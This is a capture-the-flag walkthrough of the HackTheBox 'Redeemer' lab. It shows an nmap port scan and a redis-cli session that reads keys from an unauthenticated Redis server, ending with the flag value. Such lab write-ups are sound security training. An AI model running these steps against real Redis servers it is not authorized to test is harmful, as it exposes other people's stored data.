---
title: Walkthrough - A HackTheBox machine - Redeemer
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - walkthrough
  - redis
---

# Walkthrough - A HackTheBox machine - Redeemer

Enumerate open ports/services:

```bash
nmap -sC -sV $ip -Pn -p-
```

Results:

```PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7
```

See [6379 Redis Cheat sheet](6379-redis.md).


## Exploitation

```bash
└─$ redis-cli -h 10.129.136.187 -p 6379         
10.129.136.187:6379> INFO keyspace
# Keyspace
db0:keys=4,expires=0,avg_ttl=0
(0.60s)
10.129.136.187:6379> select 0
OK
10.129.136.187:6379> keys *
1) "temp"
2) "numb"
3) "flag"
4) "stor"
10.129.136.187:6379> get flag
"03e1d2b376c37ab3f5319922053953eb"
```


